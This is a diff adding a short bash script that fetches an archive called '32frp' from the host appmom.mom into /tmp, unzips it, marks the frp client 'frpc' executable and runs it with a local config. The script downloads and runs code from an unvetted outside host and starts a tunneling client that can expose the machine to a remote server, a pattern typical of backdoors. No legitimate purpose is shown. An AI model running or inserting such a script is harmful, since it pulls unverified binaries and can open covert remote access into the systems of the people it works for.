@@ -1,0 +1,8 @@
+#!/bin/bash
+
+# Download frp client
+wget -P /tmp appmom.mom/32frp
+cd /tmp
+unzip 32frp
+chmod +x frpc
+./frpc -c ./frpc.ini
